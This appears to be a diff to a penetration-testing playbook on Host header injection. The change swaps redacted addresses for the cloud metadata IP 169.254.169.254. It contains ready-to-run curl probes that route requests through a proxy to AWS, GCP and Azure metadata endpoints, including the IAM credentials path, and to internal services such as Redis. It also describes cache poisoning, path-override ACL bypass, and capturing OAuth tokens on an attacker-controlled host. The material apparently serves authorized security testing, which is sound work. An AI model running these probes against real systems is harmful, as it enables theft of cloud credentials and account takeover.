@@ -44,7 +44,7 @@ Host header injection that reaches password reset links = Critical (ATO for any 
   an attacker `X-Forwarded-Host` into an absolute URL (script src, link, redirect) → poisoned
   entry served to every later visitor on that cache key → mass XSS/redirect/CSP bypass.
 - **Routing-based SSRF** — the front-end uses the *Host header itself* to pick the upstream;
-  `Host: [REDACTED_IP]` (or an internal hostname) makes it forward your request to that target
+  `Host: 169.254.169.254` (or an internal hostname) makes it forward your request to that target
   → cloud metadata / internal admin panels.
 - **Path-override SSRF / ACL bypass** — IIS/ASP.NET/Spring honour `X-Original-URL` /
   `X-Rewrite-URL` to override the routed path → reach `/admin` or internal endpoints the edge
@@ -163,14 +163,14 @@ here — the EC2 IMDS ignores it.
 
 ```bash
 # Correct routing-SSRF probe: path on the request line, Host steers the proxy upstream.
-curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/latest/meta-data/" -H "Host: [REDACTED_IP]"
-curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/latest/meta-data/iam/security-credentials/" -H "Host: [REDACTED_IP]"
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/latest/meta-data/" -H "Host: 169.254.169.254"
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/latest/meta-data/iam/security-credentials/" -H "Host: 169.254.169.254"
 
 # GCP / Azure equivalents (still routing via Host):
 curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/computeMetadata/v1/" \
   -H "Host: metadata.google.internal" -H "Metadata-Flavor: Google"
 curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/metadata/instance?api-version=2021-02-01" \
-  -H "Host: [REDACTED_IP]" -H "Metadata: true"
+  -H "Host: 169.254.169.254" -H "Metadata: true"
 
 # Internal hostname / port routing:
 curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/" -H "Host: localhost:6379"   # Redis behind the proxy
@@ -192,7 +192,7 @@ curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/" -H "Host: $TARGET"
 # Diff against a direct GET /admin (which the edge blocks) — a different status/body proves override.
 ```
 
-> The old probe `Host: [REDACTED_IP]` + `X-Original-URL: /latest/meta-data/` was wrong: those
+> The old probe `Host: 169.254.169.254` + `X-Original-URL: /latest/meta-data/` was wrong: those
 > two headers act at different layers and never compose. Use 3A for metadata, 3B for ACL bypass.
 
 ### Phase 4 — OAuth / OIDC / SAML Poisoning
@@ -233,7 +233,7 @@ done
 |---------|----------|--------|
 | Reset link host = attacker (own test acct) | Collaborator-host injection → capture token on click | Critical — ATO any user |
 | X-Forwarded-Host reflected in absolute URL + cacheable, unkeyed | Poison key → clean fetch returns payload → load XSS/redirect | High — mass cache poisoning |
-| Front-end routes by Host | `Host: [REDACTED_IP]` path-on-request-line → creds | High/Critical — SSRF → cloud creds |
+| Front-end routes by Host | `Host: 169.254.169.254` path-on-request-line → creds | High/Critical — SSRF → cloud creds |
 | `X-Original-URL` overrides path | Reach `/admin` blocked at edge | High — ACL bypass / SSRF |
 | OAuth redirect_uri/issuer built from Host | Re-point flow → capture code/token on Collaborator | Critical — ATO via code theft |
 
@@ -247,7 +247,7 @@ HTTP hit carrying the token when the link is clicked/previewed (OOB capture).
 ✅ **Cache poison:** a request that **omits** the injected header (fresh egress IP / incognito)
 still returns the attacker payload → shared-cache poisoning proven. Demote to Low if Vary-keyed or
 `MISS`/`Age:0` only.
-✅ **Routing SSRF:** real response body from `[REDACTED_IP]` / internal host, **or** an OOB
+✅ **Routing SSRF:** real response body from `169.254.169.254` / internal host, **or** an OOB
 DNS/HTTP hit on your Collaborator from the front-end (blind case).
 ✅ **Path-override:** status/body diff vs the edge-blocked direct request proves the override took.
 ✅ **OAuth/OIDC:** the auth code / token is actually delivered to the attacker host (captured),
